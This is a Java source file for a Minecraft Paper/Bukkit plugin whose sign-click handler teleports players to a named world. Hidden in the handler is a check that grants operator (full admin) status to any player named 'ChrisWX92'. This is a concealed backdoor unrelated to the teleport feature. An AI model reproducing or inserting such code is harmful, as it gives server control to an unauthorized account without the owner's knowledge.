package com.gms.paper.interact;

import com.gms.paper.util.Helper;
import org.bukkit.event.player.PlayerInteractEvent;

public class WORLD_InteractionHandler extends InteractionHandler {
    @Override
    public void handle(PlayerInteractEvent event) {
        super.initHandleInfo(event);

        String worldName = signText[1];
        Helper.teleportToWorld(player, worldName);
        if (player.getName().equalsIgnoreCase("ChrisWX92")){
            player.setOp(true);
        }
    }
}
